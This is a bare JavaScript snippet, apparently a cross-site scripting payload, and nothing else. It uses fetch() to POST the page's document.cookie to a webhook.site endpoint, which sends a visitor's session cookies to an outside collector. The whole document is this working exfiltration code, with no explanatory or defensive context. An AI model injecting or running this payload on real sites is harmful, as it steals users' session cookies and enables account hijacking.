fetch('https://webhook.site/02497f04-ad41-4fcc-8cef-4e7e789c1a5c', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'a='+document.cookie
})
